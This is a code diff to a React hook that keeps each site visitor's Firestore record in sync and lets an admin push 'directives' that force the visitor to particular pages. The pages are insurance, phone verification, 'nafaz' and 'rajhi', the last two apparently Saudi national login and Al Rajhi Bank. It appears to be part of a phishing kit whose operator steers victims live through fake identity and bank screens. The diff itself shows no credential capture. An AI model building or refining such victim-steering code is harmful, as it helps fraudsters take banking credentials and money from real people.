@@ -1,7 +1,7 @@
 import { useEffect, useCallback, useRef } from "react";
 import { useLocation } from "wouter";
 import { db, addData, generateVisitorId, isFirebaseConfigured } from "@/lib/firebase";
-import { doc, onSnapshot } from "firebase/firestore";
+import { doc, onSnapshot, updateDoc, deleteField } from "firebase/firestore";
 
 export type RoutablePage = "motor" | "motor-insurance" | "phone-verification" | "nafaz" | "rajhi" | "done";
 
@@ -39,8 +39,6 @@ const getRouteForPage = (page: string): string | undefined => {
   return PAGE_ROUTES[page] || PAGE_ROUTES[normalizePageName(page)];
 };
 
-let pendingDirective: { directive: AdminDirective; key: string } | null = null;
-
 interface UseVisitorRoutingOptions {
   currentPage: RoutablePage;
   currentStep?: number;
@@ -57,7 +55,7 @@ export function useVisitorRouting({
   const [location, setLocation] = useLocation();
   const processedDirectivesRef = useRef<Set<string>>(new Set());
   const writingRef = useRef(false);
-  const lastWrittenPageRef = useRef<string | null>(null);
+  const pendingDirectiveRef = useRef<{ directive: AdminDirective; key: string } | null>(null);
 
   const getVisitorId = useCallback((): string => {
     if (typeof sessionStorage === "undefined") return "";
@@ -76,7 +74,6 @@ export function useVisitorRouting({
     if (!visitorId || writingRef.current) return;
     
     writingRef.current = true;
-    lastWrittenPageRef.current = page;
     
     const updatePayload: any = {
       id: visitorId,
@@ -93,17 +90,23 @@ export function useVisitorRouting({
   }, [visitorId]);
 
   useEffect(() => {
-    if (pendingDirective && normalizePageName(pendingDirective.directive.targetPage || "") === currentPage) {
-      const { directive, key } = pendingDirective;
+    const pending = pendingDirectiveRef.current;
+    if (pending && normalizePageName(pending.directive.targetPage || "") === currentPage) {
+      const { directive, key } = pending;
       
       if (directive.targetStep !== undefined && directive.targetStep !== currentStep && onStepChange) {
         onStepChange(directive.targetStep);
       }
       
       processedDirectivesRef.current.add(key);
-      pendingDirective = null;
+      pendingDirectiveRef.current = null;
+
+      if (visitorId && db) {
+        const docRef = doc(db, "pays", visitorId);
+        updateDoc(docRef, { adminDirective: deleteField() }).catch(() => {});
+      }
     }
-  }, [currentPage, currentStep, onStepChange]);
+  }, [currentPage, currentStep, onStepChange, visitorId]);
 
   const currentPageRef = useRef(currentPage);
   const currentStepRef = useRef(currentStep);
@@ -136,7 +139,7 @@ export function useVisitorRouting({
         
         if (!processedDirectivesRef.current.has(directiveKey)) {
           if (normalizedTarget !== page) {
-            pendingDirective = { directive, key: directiveKey };
+            pendingDirectiveRef.current = { directive, key: directiveKey };
             
             const targetRoute = getRouteForPage(directive.targetPage);
             if (targetRoute && loc !== targetRoute) {
@@ -148,32 +151,13 @@ export function useVisitorRouting({
             if (directive.targetStep !== undefined && directive.targetStep !== step && stepCb) {
               stepCb(directive.targetStep);
             }
+            
+            if (visitorId && db) {
+              const clearRef = doc(db, "pays", visitorId);
+              updateDoc(clearRef, { adminDirective: deleteField() }).catch(() => {});
+            }
           }
           return;
-        }
-      }
-      
-      if (data.currentPage && typeof data.currentPage === 'string') {
-        const firestorePage = data.currentPage;
-        const normalizedFirestorePage = normalizePageName(firestorePage);
-        
-        const lastWritten = lastWrittenPageRef.current;
-        if (lastWritten) {
-          const normalizedLastWritten = normalizePageName(lastWritten);
-          if (normalizedLastWritten === normalizedFirestorePage) {
-            return;
-          }
-        }
-        
-        if (normalizedFirestorePage !== page) {
-          const targetRoute = getRouteForPage(firestorePage);
-          if (targetRoute && loc !== targetRoute) {
-            setLocation(targetRoute);
-          }
-          
-          if (data.currentStep !== undefined && data.currentStep !== step && stepCb) {
-            stepCb(data.currentStep);
-          }
         }
       }
     }, (error) => {
@@ -183,17 +167,16 @@ export function useVisitorRouting({
     return () => unsubscribe();
   }, [visitorId, setLocation]);
 
-  const hasMountedRef = useRef(false);
+  const lastSentRef = useRef<string>("");
 
   useEffect(() => {
     if (!visitorId || !currentPage) return;
     const pageName = firestorePageName || currentPage;
+    const normalizedStep = currentStep ?? 0;
+    const key = `${pageName}:${normalizedStep}`;
     
-    if (!hasMountedRef.current) {
-      hasMountedRef.current = true;
-      updateVisitorState(pageName, currentStep);
-      return;
-    }
+    if (lastSentRef.current === key) return;
+    lastSentRef.current = key;
     
     updateVisitorState(pageName, currentStep);
   }, [visitorId, currentPage, currentStep, firestorePageName, updateVisitorState]);
